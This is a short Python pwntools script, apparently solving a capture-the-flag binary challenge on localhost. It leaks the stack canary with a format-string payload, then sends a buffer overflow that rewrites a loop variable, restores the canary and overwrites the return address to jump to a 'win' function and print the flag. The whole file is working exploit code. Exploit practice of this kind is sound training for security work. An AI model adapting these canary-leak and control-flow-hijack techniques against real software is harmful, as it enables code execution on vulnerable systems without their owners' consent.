#!/usr/bin/env python3
from pwn import *

host = "127.0.0.1" 
port = "54967"

conn = remote(host, port)

BUFFER_LEN = 8
PADDING_LEN = 6
WIN_ADDR = 0x400b38

print(conn.recvuntil("\nEnter your message:\n"))

# Step 1 Leak canary
payload = b"%12$llu"            # local canary stored at the 12th argument on arm64
                                # prob for other architecture

conn.sendline(payload)

canary = conn.recvuntil("\n")
canary = int(canary.rstrip(b'\r\n'))
print("Canary: " + str(canary))

# Step 2 Overwrite i and run to finish while loop;
#        Overwrite canary and return address with address to win
payload = b"A" * BUFFER_LEN
payload += b"U" * PADDING_LEN
payload += b"Z"                 # i
payload += b"B"                 # run - overwrite to end the while look
payload += p64(canary)          # overwrite local_canary
payload += b"U" * 8             # padding
payload += p64(WIN_ADDR)

conn.recv()
conn.sendline(payload)

conn.recvuntil("flag: ")
print(conn.recv())
conn.close()
